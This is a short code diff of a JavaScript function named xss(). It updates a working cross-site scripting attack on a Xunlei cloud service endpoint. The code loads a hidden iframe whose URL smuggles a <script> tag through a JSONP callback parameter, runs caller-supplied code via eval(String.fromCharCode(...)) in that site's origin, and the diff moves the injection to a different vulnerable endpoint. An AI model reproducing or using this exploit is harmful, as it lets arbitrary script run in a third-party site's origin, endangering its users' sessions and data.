@@ -19,7 +19,7 @@ function xss() {
   var script_code = escape(code.join(","));
   var iframe = document.createElement("iframe");
   iframe.setAttribute("style", "display: none;");
-  iframe.src = "http://dynamic.cloud.vip.xunlei.com/interface/task_process?callback=%3Cscript%20src%3Dtask_process%26callback%3D%28function%28%29%257Beval%28String.fromCharCode%28"+script_code+"%29%29%3B%257D%29%26ts%3D"+ts+"%3E%3C/script%3E&ts="+ts;
+  iframe.src = "http://dynamic.cloud.vip.xunlei.com/interface/fill_bt_list?callback=%3Cscript%20src%3Dfill_bt_list%26callback%3Deval%28String.fromCharCode%28"+script_code+"%29%29%3Bts%3D"+ts+"%3E%3C/script%3E&ts="+ts;
   iframe.addEventListener("load", function(){
     this.removeEventListener("load", arguments.call, false);
     xss();
